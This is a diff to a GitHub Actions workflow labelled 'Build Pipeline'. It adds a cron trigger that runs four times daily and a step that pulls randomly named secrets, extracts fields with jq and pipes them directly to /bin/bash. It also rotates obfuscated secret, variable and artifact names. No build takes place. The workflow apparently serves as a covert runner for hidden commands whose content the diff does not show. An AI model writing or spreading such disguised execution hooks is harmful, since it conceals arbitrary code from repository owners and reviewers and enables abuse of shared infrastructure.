@@ -2,6 +2,8 @@ name: Build Pipeline
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '9 3,9,15,21 * * *'
 permissions:
   contents: read
 concurrency:
@@ -16,20 +18,15 @@ jobs:
           fetch-depth: 1
       - name: Perform
         env:
-          ebzyh439: ${{ secrets.ebzyh439 }}
+          fja362: ${{ secrets.fja362 }}
         run: |
-          printf '%s' "$ebzyh439" | jq -r .oi64 | /bin/bash
-          printf '%s' "$a465" | jq -r .hihdx6 | /bin/bash
-          echo $buwu4 | jq -r .fc206 | /bin/bash
-          echo $enne412 | jq -r .hujb8 | /bin/bash
-          printf '%s' "$jfjlw56890" | jq -r .up00039 | /bin/bash
-          echo $l79 | jq -r .sgm617 | /bin/bash
-          printf '%s' "$mw729" | jq -r .a22 | /bin/bash
+          printf '%s' "$fja362" | jq -r .klud4 | /bin/bash
+          echo $nopbm98029 | jq -r .wjsn8 | /bin/bash
 
       - name: Upload results
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: sYwoGD2g
+          name: wWxDRLz9
           path: "*.zip"
           retention-days: 1
